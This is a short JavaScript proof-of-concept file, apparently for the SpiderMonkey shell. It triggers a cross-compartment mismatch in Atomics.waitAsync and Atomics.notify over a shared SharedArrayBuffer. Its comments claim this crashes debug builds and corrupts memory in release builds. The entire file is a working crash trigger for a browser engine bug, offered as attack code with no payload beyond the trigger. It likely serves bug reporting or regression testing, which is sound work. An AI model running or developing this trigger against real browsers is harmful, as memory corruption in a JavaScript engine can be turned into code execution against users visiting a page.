// PoC: Cross-compartment Atomics.waitAsync/notify compartment mismatch
// When Atomics.waitAsync creates a promise in compartment A, and
// Atomics.notify is called from compartment B on the same SAB,
// the promise resolution in atomics_notify_impl doesn't properly
// handle cross-compartment promises, leading to a compartment mismatch.
//
// In debug builds: MOZ_CRASH on cx->check() compartment mismatch
// In release builds: memory corruption (compartment check is compiled out)

// Create a new compartment (simulates cross-origin iframe)
var g = newGlobal({newCompartment: true});

// Create a SharedArrayBuffer and share it between compartments
var sab = new SharedArrayBuffer(64);
var ta = new Int32Array(sab);

// Share the SAB with the other global
g.sab = sab;
g.evaluate(`
  var ta2 = new Int32Array(sab);
`);

// Create waitAsync in THIS compartment - promise is in THIS compartment
var results = [];
for (var i = 0; i < 10; i++) {
  var r = Atomics.waitAsync(ta, 0, 0, 5000);
  if (r.async) {
    results.push(r);
  }
}

// Notify from the OTHER compartment
// This triggers atomics_notify_impl which tries to resolve
// the promises from compartment A while in compartment B's context
g.evaluate(`
  Atomics.notify(ta2, 0);
`);